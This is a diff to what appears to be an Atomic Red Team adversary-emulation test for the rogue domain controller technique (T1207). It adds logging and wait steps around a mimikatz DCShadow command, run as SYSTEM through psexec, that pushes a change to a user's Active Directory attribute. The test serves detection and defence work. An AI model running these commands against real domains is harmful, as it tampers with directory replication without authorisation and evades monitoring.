@@ -56,13 +56,24 @@ atomic_tests:
     elevation_required: true
     command: |
       # starting fake DC server, as SYSTEM (required)
-      $mimikatzParam ="`"lsadump::dcshadow /object:#{user} /attribute:badpwdcount /value:9999`" `"exit`""
-      Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"
+      $dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
+      Remove-Item $dc_output_file -ErrorAction Ignore
+      $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{user} /attribute:badpwdcount /value:9999`" `"exit`""
+      $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"
 
       # wait for fake DC server to be ready...
       Start-Sleep -Seconds 5
 
       # server ready, so trigger replication (push) and wait until it finished
       & #{mimikatz_path} "lsadump::dcshadow /push" "exit"
+
+      Write-Host "`nWaiting for fake DC server to return"
+      Wait-Process $dc
+
+      Write-Host "`nOutput from fake DC server:"
+      Get-Content $dc_output_file
+      Remove-Item $dc_output_file -ErrorAction Ignore
+
+      Write-Host "End of DCShadow"
     cleanup_command: |
       Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
